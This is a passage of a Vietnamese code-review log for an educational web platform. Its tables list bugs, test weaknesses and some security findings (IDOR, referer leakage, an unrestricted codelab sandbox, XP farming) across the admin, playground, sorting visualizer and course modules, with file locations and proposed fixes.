| AD-031 | `AdminController.cs:33-35,552-569` | Rate limiter impersonate static in-memory read-modify-write không atomic, reset khi restart, không evict |
| AD-032 | `AdminController.cs:214-236` | TogglePremium không đối chiếu Orders: thu hồi premium khi còn order Pending → webhook sau đó bật lại |
| AD-033 | `AdminController.cs:242-306` | CreateUser không validate request.Role (role lạ → Student im lặng) + trả 200 thay 201 |
| AD-034 | `backend/tests` (toàn bộ) | **Zero test xUnit cho AdminController**: ban→chặn login/refresh, IDOR 404, LAST_ADMIN_PROTECTED, 429 impersonate, Teacher→403, role/premium/audit |
| AD-035 | `adminP0Tests.spec.ts:63` + `adminP2Tests.spec.ts:78` | Catch-all mock `{ok:true,json:{}}` cho URL lạ → gọi sai URL/payload vẫn pass |
| AD-036 | `adminP2Tests.spec.ts:816-844` | Test impersonate không assert store.impersonate gọi + redirect + shape user |
| AD-037 | `adminP2Tests.spec.ts:432-455,470-489` | Test create user dùng `if (textInputs.length > 0)` → input không tìm thấy vẫn pass; không assert body POST |
| AD-038 | `AdminUsersTab/AdminDashboardTab/AdminAuditTab` | Admin fetch không test 401→refresh→retry |
| AD-039 | `useAdminApi.ts` (toàn file) | Không tồn tại contract spec; API logic rải trong 4 tab — URL/payload chỉ test gián tiếp |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| AD-040 | `SystemAuditEventStream.cs:59` | Sequence = DateTime.UtcNow.Ticks không đảm bảo tăng chặt (concurrent trùng) |
| AD-041 | `AdminController.cs:67` | `"paid"` magic string dead (backend chỉ ghi "Completed") |
| AD-042 | `AdminController.cs:534` | `SaveChangesAsync();;` — dấu ;; thừa |
| AD-043 | `StatelessAuthStrategy.cs:372-386` | Refresh token impersonate xoay → GenerateAuthResponse sinh token THẬT mất marker isImpersonated → phiên không truy vết |
| AD-044 | `useAuthStore.ts:343-356` | startImpersonating dead code — AdminUsersTab tự fetch + gọi impersonate() trực tiếp (logic nhân đôi) |
| AD-045 | `AdminPanelView.vue:65-69,31-33` | refresh-dashboard emit dead (tab bị v-if unmount → ref null) |
| AD-046 | `AdminUsersTab.vue:228-235` | Xóa user trang cuối không lùi page → bảng trống "Không tìm thấy" |
| AD-047 | `AdminUsersTab.vue:243-262` | submitCreateUser không guard submittingUser đầu hàm → Enter double-create |
| AD-048 | `AdminSystemTab.vue:40` + `AdminDashboardTab.vue:166` | setTimeout không clear khi unmount + pushLog spam mỗi mount |
| AD-049 | `AdminUsersTab.vue:237` | showUserAudit không hiện audit — tên gây hiểu lầm |
| AD-050 | `AdminUsersTab.vue:14-59` | Bảng users không overflow-x-auto → vỡ layout mobile |
| AD-051 | `App.vue:118-122` + `AdminUsersTab.vue:223` | Thoát đóng vai: alert native + về tab mặc định; impersonate dùng window.location.href full reload |
| AD-052 | `AdminAuditTab.vue:65` | Lỗi tải audit chỉ console.error; nút Làm mới không disabled khi loading |
| AD-053 | `AdminSystemTab.vue:13,38` | Nút "Chạy chẩn đoán" không running state; checkbox dead không giải thích |
| AD-054 | `AdminPanelView.vue:62` | Tab không lưu state (refresh mất tab/search/page) |
| AD-055 | `AdminUsersTab.vue:23-56` + `AdminDashboardTab.vue:93` | Bảng không caption/aria-label |
| AD-056 | `AdminSystemTab.vue:8` | "Stateless JWT JWT" lỗi chính tả lặp từ |
| AD-057 | `adminP0Tests` + `adminP2Tests` | Type `any` tràn lan trong test (vi phạm no-any) |
| AD-058 | `routerGuardTests.spec.ts:131-170` | Thiếu case Teacher → /admin phải redirect |
| AD-059 | `adminP0Tests.spec.ts:544-554` | Nút Làm mới audit dùng chung class .btn-create-user — test brittle |
| AD-060 | `adminP2Tests.spec.ts:347-362` | Test search không assert giá trị encoded/page reset |

---

## 🔬 REVIEW ROUND 10 — 2026-08-11: HTML Playground (3 sub-agent, 33 lỗi ghi nhận)

**Scope:** `frontend/src/features/html-playground/**` (PlaygroundWorkspace, PlaygroundPreview, useHtmlPlaygroundStore, PlaygroundDocumentBuilder, PlaygroundUrlCodec, PlaygroundDebouncer, playgroundDemos) + `views/playground/PlaygroundView.vue` (route `/playground`).
**Phương pháp:** 3 góc nhìn (Logic Engine / UI-UX / Test-Integration) — đã khử trùng lặp, ID HT-001→033 (P1=4, P2=13, P3=16). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Engine+Core / View+Demos / Tests). Kết quả: frontend **2911/2911 PASS** (159 files, +45), `vue-tsc` 0 lỗi. Chi tiết fix: `plan/tracking/errors.md` Review Round 10.

### 🟠 P1

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| HT-001 | `PlaygroundWorkspace.vue:88` + `useHtmlPlaygroundStore.ts:23` | **Debouncer 800ms vô hiệu:** `:srcDoc="store.documentHtml"` binding reactive → mỗi keystroke reload iframe ngay (bỏ qua debounce); `previewKey++` chỉ thêm remount trùng sau 800ms → 2 lần reload/burst, state preview bị reset | Tách `previewDoc = ref('')` — chỉ commit khi debouncer/Run kích hoạt (gating) |
| HT-002 | `PlaygroundPreview.vue:4-9` | **Rò rỉ Referer:** URL trang (kèm `?code=<payload>` chứa source code user) gửi đến mọi host ngoài mà user code tham chiếu (img/link/script/CSS url) | iframe `referrerpolicy="no-referrer"` |
| HT-003 | `PlaygroundWorkspace.vue` + `PlaygroundPreview.vue` | **JS runtime/syntax error im lặng hoàn toàn** — không overlay/toast/error bridge; code lỗi → preview trắng/treo không hiểu vì sao; `while(true)` không báo | Inject `window.onerror` → postMessage về parent → console panel/toast |
| HT-004 | `PlaygroundView.vue:71-81` | **Luồng "Share URL → nạp state" không có test nào** — không mount view, không test router query `code` thật, không test roundtrip encodeURIComponent, không test payload hỏng | Thêm PlaygroundView.spec.ts (pinia + memory router + query code) |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| HT-005 | `PlaygroundDocumentBuilder.ts:9-25` | Thiếu `<base>` tag → URL tương đối trong user code resolve về origin app + request mang cookie session (CSRF-lite) |
| HT-006 | `PlaygroundUrlCodec.ts:9-11` + `PlaygroundWorkspace.vue:162-172` | Không guard dung lượng payload — code dài → URL vượt ~8KB bị cắt, decode thất bại im lặng (chỉ console.warn), mất code |
| HT-007 | `PlaygroundDocumentBuilder.ts:15-23` | Thiếu CSP meta — user code fetch/beacon ra ngoài (không lấy cookie do opaque origin nhưng là kênh phát tán/phishing) |
| HT-008 | `PlaygroundWorkspace.vue:146-148,174-181` | Không loading indicator khi compile/run — preview âm thầm remount, nút Run không trạng thái đang chạy |
| HT-009 | `PlaygroundWorkspace.vue:174-181` | Auto-run không thể tắt — code JS nặng (vòng lặp vô hạn) tự chạy lại mỗi 800ms, không pause toggle |
| HT-010 | `PlaygroundWorkspace.vue:70` | Split editor/preview không resize được (grid cố định, dải 2px trang trí) |
| HT-011 | `PlaygroundView.vue:25-26` | Switch mode free↔algo destroy/remount Monaco — chậm + mất undo history + scroll position |
| HT-012 | `PlaygroundView.vue:59-69,81` | `?code=` bị xoá khi switch mode (query: {}) → refresh mất toàn bộ code/share link |
| HT-013 | `PlaygroundWorkspace.vue:150-156` | Reset mất code không undo được (setValue reset undo stack) + không confirm + ép nhảy tab HTML |
| HT-014 | `PlaygroundWorkspace.vue:88` | Remount iframe `:key` mỗi auto-run → state tương tác trong preview (button đếm) tự về 0 |
| HT-015 | `editorP2Tests.spec.ts:947-960` | Test pass giả "debounced preview update" — tự tạo PlaygroundDebouncer riêng, không test watch thật trong component |
| HT-016 | `editorP2Tests.spec.ts:11-23` | Mock Monaco no-op → không test được contract editor↔store (type→store, Run→previewKey, tab→editor value) |
| HT-017 | `PlaygroundView.vue:59-69` | Store reset khi đổi mode/demo chưa có test xác định hành vi |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| HT-018 | `PlaygroundWorkspace.vue:146-148,177-179` | Nhấn Run khi còn pending debounce → iframe reload 2 lần (nên debouncer.flush()) |
| HT-019 | `PlaygroundWorkspace.vue:214-236,204-207` | Phantom run sau Reset/load share: watch revision → setValue → onDidChangeModelContent → watch → debounced run thừa (cần flag isProgrammaticWrite) |
| HT-020 | `PlaygroundUrlCodec.ts:31-33` | decode() console.error mỗi payload hỏng — spam log, URL độc paste bậy |
| HT-021 | `useHtmlPlaygroundStore.ts:45-58` | loadFromSource không reset activeTab (resetToDefault có reset) — sau share link nhảy tab sai |
| HT-022 | `PlaygroundWorkspace.vue:150` | handleReset async nhưng không await gì |
| HT-023 | `PlaygroundPreview.vue:6` | allow-modals + allow-popups → user code alert() vô hạn / window.open thoát ra tab ngoài |
| HT-024 | `PlaygroundWorkspace.vue:55-68` | Tabs thiếu WAI-ARIA tabs (aria-controls, phím mũi tên, tabindex) |
| HT-025 | `PlaygroundView.vue:71-79` | Payload share hỏng chỉ console.warn — user mở link hỏng thấy code mặc định |
| HT-026 | `PlaygroundWorkspace.vue:72-81` | Fallback Monaco text "Playground vẫn chạy được" gây hiểu lầm — không có textarea thay thế |
| HT-027 | `PlaygroundWorkspace.vue:3-53` | Toolbar không responsive mobile + preview 45% cố định |
| HT-028 | `PlaygroundWorkspace.vue:28-36,87` | Focus không quản lý khi ẩn preview |
| HT-029 | `htmlP0Tests.spec.ts:8-20` | Stub canvas vô dụng + `as any` 3 chỗ (vi phạm no-any) |
| HT-030 | `htmlP0Tests.spec.ts:78-85` | Test "runCode" tautology — API runCode không tồn tại trong store |
| HT-031 | `PlaygroundDocumentBuilder.spec.ts:44-53` | Escape thiếu vector `<!--` (HTML comment trong script) + unicode qua builder |
| HT-032 | `playgroundDemos.spec.ts:24-32` | Demo không thực thi — syntax error trong demo vẫn pass test (nên `new Function(js)` + gọi run()) |
| HT-033 | `useHtmlPlaygroundStore.ts:25-29` | activeCode computed chưa có test trực tiếp (3 tab) |

---

## 🔬 REVIEW ROUND 11 — 2026-08-11: Algo Playground + Custom Input (3 sub-agent, 49 lỗi ghi nhận)

**Scope:** `frontend/src/features/algo-playground/**` (3 SortingAnimationEngine, AlgoInputParser, compileErrorTranslator, playgroundAlgoDemos, useAlgoPlaygroundStore, useAlgoAnimation, algoCanvasHelpers, AlgoPlaygroundWorkspace) + `frontend/src/features/custom-input/**` (useInputStore, useCustomInputForm, CustomInputForm).
**Phương pháp:** 3 góc nhìn (Logic Engine / UI-UX+Store / Test-Integration) — đã khử trùng lặp, ID AL-001→049 (P1=9, P2=24, P3=16). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Engine / Store+UI / Tests). Kết quả: frontend **2942/2942 PASS** (161 files, +31), `vue-tsc` 0 lỗi. Chi tiết fix: `plan/tracking/errors.md` Review Round 11. Còn lại: AL-042 PARTIAL (setLimit test pin).

### 🟠 P1

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| AL-001 | `AlgoPlaygroundWorkspace.vue:526` + `PlaygroundView.vue:27` | KeepAlive deactivate: phím tắt Space/Arrow treo trên window vẫn sống → đang ở mode Editor tự do, Space/Arrow điều khiển animation ẩn | onActivated/onDeactivated đăng ký/gỡ handler + cờ visible |
| AL-002 | `useAlgoAnimation.ts:39-47` + engine.play() | KeepAlive deactivate: engine rAF chạy 60FPS ngầm (chỉ destroy khi unmount thật) → đốt CPU + playback trôi xa khi quay lại | onDeactivated → pause; onActivated → sync + play theo store |
| AL-003 | `useAlgoAnimation.ts:39-56` + `useAlgoPlaygroundStore.ts:190-196` | **Play→compile→auto-play chết ngầm:** watcher isPlaying chạy trước watcher frames → engine.pause() ghi đè play; store isPlaying=true nhưng engine đứng im frame 0 | Watcher frames: `store.isPlaying ? engine.play() : engine.pause()` |
| AL-004 | `useAlgoPlaygroundStore.ts:146-157,180-207` | Race stale state đổi demo/code giữa compile: không bump runSeq + không clear pendingPlayAfterCompile → frames cũ đè lên + autoplay bất ngờ | loadDemo/invalidate/setInput → runSeq++ + pendingPlay=false |
| AL-005 | `useAlgoPlaygroundStore.ts:163-165` | setInput không gọi invalidate() (setCode thì có) → sửa input rồi Play vẫn phát FRAMES cũ (vi phạm Data-Driven) | setInput gọi invalidate() |
| AL-006 | `useInputStore.ts:105-141` + `CustomInputForm.vue:56-57` | submitCustomInput không AbortController/requestId; "Xóa Trắng" không disabled khi isLoading → 2 request race, response cũ ghi đè | requestId + AbortController + check sau await |
| AL-007 | `playgroundP2Tests.spec.ts:70-99,145-148,157-170,301-333` + `customInputP2Tests.spec.ts:69-83` | ~5 test pass giả: assert biến local (editorLoadError/EMPTY_STATE_TEXT), tái tạo ternary theme, closure menu, clear button no-op không click | Mount component + tương tác thật |
| AL-008 | (thiếu file) | **Không tồn tại `useAlgoAnimation.spec.ts`** — race pause/play, advance frame cuối, watcher speed/demoId đều mù (AL-003 sống sót vì vậy) | Viết spec với rAF stub tick |
| AL-009 | (thiếu file) | **Không tồn tại `algoCanvasHelpers.spec.ts`** — drawPlaybackFrame/Transition (tree/graph) chưa test | Viết spec assert draw calls/lerp |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| AL-010 | `AlgoInputParser.ts:39-44` | Parser chấp nhận `Infinity`/`-Infinity`/`1e999` (Number('Infinity') không NaN) → bar vẽ méo không báo lỗi |
| AL-011 | `playgroundAlgoDemos.ts:301-304` + store:187 | Input rỗng + Counting Sort → `Math.min(...[])` = Infinity → RangeError "Invalid array length" tiếng Anh thô |
| AL-012 | `useAlgoPlaygroundStore.ts:197-203` | Error path không reset isPlaying → UI treo nút pause với timeline rỗng |
| AL-013 | `compileErrorTranslator.ts:18-30` | Thiếu 4 case hay gặp: "Invalid array length", "Maximum call stack", "X is not defined", "Cannot read properties of null" |
| AL-014 | `AlgoPlaygroundWorkspace.vue:505-510` | Link `?demo=` bị bỏ qua khi localStorage đã persist code (watch không immediate) — URL bị lờ |
| AL-015 | `useCustomInputForm.ts:71` | Esc xóa SẠCH textarea mất dữ liệu vô tình (nên chỉ đóng dropdown khi mở) |
| AL-016 | `useCustomInputForm.ts:70` + `CustomInputForm.vue:32` | Ctrl+Shift+R là tổ hợp trình duyệt (không chặn được) → hint gây reload thay vì random |
| AL-017 | `AlgoPlaygroundWorkspace.vue:111` | canvas thiếu role="img" + aria-label |
| AL-018 | `CustomInputForm.vue:20-31,39-53` | A11y: label không for/id, lỗi không aria-live, dropdown thiếu aria-expanded |
| AL-019 | `useAlgoPlaygroundStore.ts:180-207` | run() khi đang play không dừng ngay (isPlaying tắt sau compile xong) → frames cũ advance nền |
| AL-020 | `useAlgoPlaygroundStore.spec.ts:103-104` + `playgroundP0Tests.spec.ts:158-159` | jumpToFrame(-5) chốt hành vi no-op (không clamp) — test pin hành vi sai |
| AL-021 | `SortingAnimationEngine.spec.ts:195` | `rafCb(500_000)` hằng số cứng → flaky khi performance.now() vượt |
| AL-022 | `AlgoPlaygroundWorkspace.spec.ts:185-192` | Test Space hotkey chỉ assert icon tồn tại — không chứng minh togglePlay |
| AL-023 | `customInputP2Tests.spec.ts:117-132,282-306` | CI-008/011 không assert loadResult/fallback dummy thật |
| AL-024 | `customInputP2Tests.spec.ts:197-237` | CI-013 gọi thẳng store — wiring algorithmId qua component chưa test |
| AL-025 | `playgroundP2Tests.spec.ts:487-526` | Responsive test assert mock matchMedia, không check layout thật |
| AL-026 | `playgroundP2Tests.spec.ts:402-430` | Gutter click Monaco chưa simulate (handler thật chưa test) |
| AL-027 | `playgroundP2Tests.spec.ts:196-207` | US-AP-020 tự dựng chuỗi "Dòng X" — không check DOM description thật |
| AL-028 | `useAlgoPlaygroundStore.spec.ts` (thiếu) | Chưa test pendingPlayAfterCompile (play trước compile → auto-play) + replay ở frame cuối |
| AL-029 | `SortingAnimationEngine.spec.ts` (thiếu) | Chưa test setSpeed/pause giữa transition/snapToCurrent/destroy khi play/swap OOB |
| AL-030 | `HeapSortAnimationEngine.spec.ts:58-72` | isSiftSwap (swap cha↔con) chưa test |
| AL-031 | `useInputStore.ts:77` + `useCustomInputForm.ts` | setAlgorithmLimit không bao giờ nối trong form → UI luôn hiện limit 15 dù bubble-sort=50 |
| AL-032 | `MergeSortAnimationEngine.spec.ts:47-71` | Smoke-only — regression tier vẽ không bị phát hiện |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| AL-033 | HeapSort:150-151, MergeSort:76, algoCanvasHelpers:120-121, demos:301-302 | `Math.max/min(...arr)` spread chưa thống nhất (EC-022) — 5 chỗ |
| AL-034 | `SortingAnimationEngine.ts:217-241,462-463,568-570` | computeGeo cấp phát object mỗi frame (2 lần/tick × 60fps × 100 bars) |
| AL-035 | `SortingAnimationEngine.ts:268,303` | Dead code: `const snapshot = this.curr`, `const idx = this.curr?.comparingIndices` |
| AL-036 | 4 file engine/renderer | Duplicate COLORS/roundRect/lerpColor/easeInOut — gom vào algoCanvasHelpers |
| AL-037 | `HeapSortAnimationEngine.ts:58-63` | captionFor nhầm ngữ cảnh: sw[0]===0 không phân biệt swap root vs sift-down |
| AL-038 | `playgroundAlgoDemos.ts:413` | setBucketComparing(j,j) trùng index → highlight toàn bộ bucket |
| AL-039 | `MergeSortAnimationEngine.ts:94` | Số âm vẽ barH 3px nằm đáy thay vì đâm xuống baseline (Sorting đã xử lý zeroY) |
| AL-040 | `AlgoPlaygroundWorkspace.vue:373` | `store.playbackSpeed = ...` mutation trực tiếp (nên action setPlaybackSpeed) |
| AL-041 | `CustomInputForm.vue:21` | `v-model="inputStore.rawText"` mutation trực tiếp store |
| AL-042 | `useAlgoPlaygroundStore.ts:42-43,73-75` + `useInputStore.ts:73-75` | Dead code: isAtStart/isAtEnd/setLimit không ai dùng |
| AL-043 | `AlgoPlaygroundWorkspace.vue:59-71` | Popover Hooks/menu định vị cứng → lệch khi toolbar wrap; menu không Esc close |
| AL-044 | store + `AlgoInputParser.ts:31-51` | Input trống/", ," parse [] vẫn Chạy được → 1 frame vô nghĩa |
| AL-045 | `AlgoPlaygroundWorkspace.vue:505-510` | Auto-run vô điều kiện mỗi mount — quay lại view bị re-compile reset trạng thái |
| AL-046 | `AlgoPlaygroundWorkspace.spec.ts:115-129` | onShare setTimeout(2000) không clear + không fake timers → rò timer |
| AL-047 | `playgroundP2Tests.spec.ts:631-642` + `playgroundAlgoDemos.spec.ts:17` | 21 id demo cứng trùng lặp 2 nơi — thêm demo vỡ cả 2 |
| AL-048 | `AlgoPlaygroundWorkspace.spec.ts:216-223` | Mock compileInWorker không resolve → promise treo |
| AL-049 | `customInputP2Tests.spec.ts:19-23` | Mount thiếu prop bắt buộc algorithmId → console warning |

---

## 🔬 REVIEW ROUND 12 — 2026-08-11: Sorting Visualizer (3 sub-agent, 44 lỗi ghi nhận)

**Scope:** `frontend/src/features/algorithm-sandbox/**` (7 engine algorithms/*.ts, useSortingAnimation, 4 composable riêng, sortingIdEnricher, PseudocodeSyncer, MonacoLineSyncerCoordinator, MonacoGutterClickInterceptor, 20+ component visualizer).
**Phương pháp:** 3 góc nhìn (Logic Engine / UI-UX+Renderer / Test-Integration) — đã khử trùng lặp, ID SV-001→044 (P0=1, P1=3, P2=13, P3=27). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Engine / UI+Renderer / Tests). Kết quả: frontend **3058/3058 PASS** (163 files, +116), `vue-tsc` 0 lỗi. Chi tiết fix: `plan/tracking/errors.md` Review Round 12. **CC-009 giờ phủ toàn bộ 7 engine sorting.**

### 🔴 P0

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| SV-001 | `sortingP2Tests.spec.ts:231` (US-AS-013) | **Test pass giả phụ thuộc thứ tự (order coupling):** assert `toContain('Bubble Sort')` khớp vào description frame cuối trong trace table 'vars' chứ không phải label thuật toán; singleton `_sharedInstance` khóa pinia cũ → **chạy riêng test này FAIL, chạy sau test khác PASS** (đã chứng minh) | afterEach reset `_sharedInstance=null`; mount panel gắn đúng pinia; assert algoLabel trong tab detail |

### 🟠 P1

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| SV-002 | `sorting.types.ts:22-67` + 7 engine | **Cả 7 engine thiếu contract CC-009:** SortFrame không có `lineNumber`/`activeLogicalLineId`/`highlights` → currentLineNumber luôn 0 → MonacoLineSyncerCoordinator + pseudocode highlight + gutter click **chết im lặng toàn bộ** | Thêm field vào SortFrame + emit từ engine + test currentLineNumber>0 |
| SV-003 | `MergeSortVisualizer.vue:28-29` | **FLIP animation Merge chết:** transition-group key theo vị trí (`sub.start+idx-1`) thay vì identity item → phần tử "nhảy" tại chỗ, mất hoạt cảnh trộn | Đổi key thành `item.id` (arrayStateWithIds) |
| SV-004 | `mergeSort.ts:88-94` | **Bug nguồn:** mảng 1 phần tử → merge() không chạy → frame cuối `sortedIndices=[]` (không đánh dấu sorted, mâu thuẫn heap `[7]→[0]`) — không test bắt | Test + fix đánh dấu sorted cho n=1 |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| SV-005 | `useSortingAnimation.ts:73-79` | Generator throw → sortFrames=[] nhưng vcrStore.playbackFrames giữ frame cũ → VCR dock đếm cũ + Play chạy lệch |
| SV-006 | `useSortingAnimation.ts:15-22,92-96` | Singleton + onMounted 1 lần → quay lại route lần 2 không selectAlgorithm → frames cũ/mâu thuẫn với feature khác |
| SV-007 | `MonacoLineSyncerCoordinator.ts:37-42` | Gutter click findIndex → luôn frame ĐẦU TIÊN khớp line (multi-step pattern PS-011) thay vì frame gần nhất |
| SV-008 | 7 engine + renderer (bucketSort:25-26, countingSort:14-16, radixSort:15-17, BubbleSortVisualizer:73,78...) | Pattern EC-022 `Math.max/min(...)` spread còn ở khắp nơi — mảng lớn RangeError |
| SV-009 | `sortingIdEnricher.ts:49-70` | Greedy nearest-value O(n²)/frame → O(n³) tổng (EC-009 tái phát) |
| SV-010 | `MergeSortVisualizer.vue:49,80-91` + .css | Scroll drift: TREE_ROW_HEIGHT 104 vs CSS 96 → cuộn sâu cắt đầu + thừa cuối |
| SV-011 | `MonacoLineSyncerCoordinator.spec.ts` | Không test đường huyết mạch: watch currentLineNumber→syncLineToEditor (decorations/reveal), gutter line không frame, multi-line logicalId |
| SV-012 | `sortingEdgeCases.spec.ts` | Matrix edge không đủ: thiếu single-element/empty/duplicate/sorted/reversed cho 7 engine (chỉ counting/radix/merge phủ một phần) |
| SV-013 | `sortingEdgeCases.spec.ts:129` | Perf 100 phần tử chỉ quickSort (ascending + assert cuối) — không frame-count bound cho engine nào |
| SV-014 | `sortingP0/P2Tests.spec.ts` | Race đổi input giữa playback (isPlaying=true) chưa test — EC-010/EC-011 trong ngữ cảnh sorting |
| SV-015 | RadixSortVisualizer.vue + SortingAlgorithmControls.vue + 4 composable riêng | **0 test** — logic phase/color/label chỉ cover gián tiếp |
| SV-016 | `PseudocodeSyncer.spec.ts` | Multi-line mapping + highlightMonacoLine chưa test; trùng logic PseudocodeSyncEngine (PS-016) |
| SV-017 | `sortingEdgeCases.spec.ts:236-244` | Greedy matching với giá trị trùng `[5,3,5,3,2]` chưa test — id có thể gán sai mà test vẫn xanh |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| SV-018 | `bubbleSort.ts:24-68` | Không early-exit mảng đã sorted → luôn O(n²) frame, mỗi frame copy O(n) |
| SV-019 | `heapSort.ts:75` + useHeapSortVisualizer:14-19 | Frame hoàn thành heapSize:0 → phase 'SORT' sai trên frame cuối |
| SV-020 | `useHeapSortVisualizer.ts:89-101` | node-violation check trước ci/si → che highlight node-comparing |
| SV-021 | `mergeSort.ts:89-93` | sortedIndices.includes O(n) trong vòng lặp |
| SV-022 | `PseudocodeSyncer.ts:15,28-39` | Dead API getLineForStep/getFirstStepForLine/codeSnippet (chỉ test dùng) |
| SV-023 | `MonacoGutterClickInterceptor.ts:21-29` | Không check e.event.button → click chuột phải cũng jump |
| SV-024 | `useSortingAnimation.ts:55-71` | Input >15 slice lặng lẽ không cảnh báo + parse token trùng vcrStore.inputArray |
| SV-025 | `quickSort.ts:69-74` | pIdx===high → emit self-swap [high,high] + tăng swaps |
| SV-026 | `SortingDetailPanel.vue:29` | "Bước: 1/0" khi chưa có frame (mâu thuẫn 0/0 chuẩn) |
| SV-027 | `SortingDetailPanel.vue:75-85` + bucketSort:107,128 | Bucket distribute comparingIndices=[i,i] → label "tự so sánh" |
| SV-028 | `SortingView.vue:22` | Badge "60FPS" sai — thực tế setInterval VCR |
| SV-029 | `SortingView.vue:66` | HelpButton dead import |
| SV-030 | `useRadixSortVisualizer.ts:138-144,169` + useHeapSortVisualizer:26-49 | Dead: childIndices, miniStepDescription |
| SV-031 | `SortingTraceTable.vue:8-15,30` | A11y: th thiếu scope, không caption, row không bàn phím |
| SV-032 | `SortingAlgorithmControls.vue:5-14` | Nút thuật toán thiếu aria-pressed/type=button |
| SV-033 | `CountingArray.vue:49` + `CountingOutput.vue:44` | --count-items chưa bao giờ set → grid mobile luôn 8 cột |
| SV-034 | `ArrayBarVisualizer.vue:100` | Mutation trực tiếp vcrStore.rawInputArray (store discipline) |
| SV-035 | `SortingHudOverlay.vue:3` | line-clamp-1 cắt description, không tooltip |
| SV-036 | `RadixBanner.vue:18-22` | activeDigitPlace > 100 → không chip nào sáng |
| SV-037 | `RadixInspector.vue:12-25` | 2 ô stat cùng label "Phần tử" |
| SV-038 | `SortingTraceTable.vue:173-179` | scrollIntoView smooth mỗi frame khi playback → jank |
| SV-039 | `SortingVisualizerDispatcher.vue:6` | Empty state text nói "nhập dữ liệu không hợp lệ" — view không có ô nhập tay |
| SV-040 | `QuickSortVisualizer.vue:15-16,43` | hoveredIdx không reset khi frame đổi → tooltip frame cũ |
| SV-041 | `sorting.spec.ts:98-105` | Test FIFO không phát hiện vi phạm (mảng 3 pass tự sửa) |
| SV-042 | `sortingP2Tests.spec.ts:116` + `MonacoLineSyncerCoordinator.spec.ts:5-7,36` | `as any` trong test |
| SV-043 | `useSortingAnimation.ts:92-96` | onMounted top-level trong composable → warning mỗi test gọi trực tiếp |
| SV-044 | `sortingP2Tests.spec.ts` (US-AS-006/008/020) | Dispatcher chưa test render đúng component theo algorithm + OOB merge/heap/quick |

---

## 🔬 REVIEW ROUND 13 — 2026-08-11: Courses & Lessons LMS (3 sub-agent, 71 lỗi ghi nhận)

**Scope:** frontend `features/lesson/**` (codelabExecutor, codelab.worker, codelabTaskRegistry, sandboxConfig, useLessonStore, lessonApi, LessonStepCodeLab, LessonStudyView...) + `features/courses/**` (useCourseStore, courseApi, CourseCard, CourseSidebar...) + `views/courses|lesson/**` · backend `CourseController.cs`/`LessonController.cs`/`LessonReviewController.cs`/`ClassroomProgressController.cs`.
**Phương pháp:** 3 góc nhìn (Engine+Backend / UI-UX / Test-Integration) — đã khử trùng lặp, ID LM-001→071 (P0=3, P1=19, P2=32, P3=17). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Backend+Codelab / Store+UI / Tests). Kết quả: frontend **3086/3086 PASS** (166 files, +28), `vue-tsc` 0 lỗi, backend **507/507 PASS**. Chi tiết fix: `plan/tracking/errors.md` Review Round 13. Còn lại: LM-058 DEFERRED (worker pool TODO).

### 🔴 P0

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| LM-001 | `CourseController.cs:471,497` + `LessonController.cs:206,231` | **Route TRÙNG** PUT/DELETE `/lessons/{id}` ở 2 controller → mọi sửa/xóa lesson ném AmbiguousMatchException 500; 2 logic cập nhật lệch nhau (MediatR vs entity) | Giữ 1 implementation duy nhất |
| LM-002 | `coursesP0Tests.spec.ts:344,362` | Test CR-009 `find('a.rl-stub')` luôn trả wrapper → `toBeDefined()` pass giả 100% (CTA thật không render khi chưa auth) | `exists()` + mock isAuthenticated tường minh |
| LM-003 | `lessonP2Tests.spec.ts:343-354` | US-LN-027 chỉ assert `wrapper.exists()` — debounce search không verify gì | Assert fetch URL `?search=` sau advance timers |

### 🟠 P1

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| LM-004 | `codelabExecutor.ts:50` + `codelab.worker.ts` | **Sandbox codelab không chặn mạng (CV-103) + không LOOP_LIMIT/sentinel (CV-108)** — code sinh viên fetch/importScripts ra ngoài, `while(true)` không bị chặn | Che fetch/XHR/importScripts trong worker + LOOP_LIMIT sentinel + test |
| LM-005 | `StatelessAuthController.cs:388-441` | `/auth/progress/{lessonId}` KHÔNG gate publish/premium — học viên đoán GUID bài Draft/premium vẫn ghi Completed + XP | Áp dụng chung gate như CompleteLesson |
| LM-006 | `StatelessAuthController.cs:574-639` | **XP farm:** award-xp chỉ clamp 1..500/request, không rate-limit/verify lý do — gọi lặp vô hạn cộng XP; XPRewarded do client tự khai (clamp 10000) | Cấp XP server-side + cap/ngày + rate limit |
| LM-007 | `ClassroomProgressController.cs:45-54` + Service:124-127 | IDOR: GET `/classrooms/{id}/unlocked-items` không check enrollment → đọc unlock của classroom bất kỳ | Check enrollment trước |
| LM-008 | `CourseController.cs:39-59` | GetCourses không lọc IsPublished — lộ metadata khóa Draft (client tự lọc) | Server filter |
| LM-009 | `LessonController.cs:144-195` | CompleteLesson không atomic — 2 request song song → duplicate key 500 + double XP | Upsert ON CONFLICT / transaction |
| LM-010 | `useLessonStore.ts:348-419,141-176` | **Race đổi bài:** submitQuiz/completeCodelab mutate XP sau await KHÔNG check lessonLoadRequestId → XP bài A ghi vào bài B + localStorage ghi đè | Capture lessonId + check sau mỗi await |
| LM-011 | `CourseController.cs:320-348` + AddModuleItemHandler:26-32 | AddModuleItem không validate ownership Lesson/Quiz/Codelab — teacher gắn nội dung teacher khác → cross-course leak | Validate ownership |
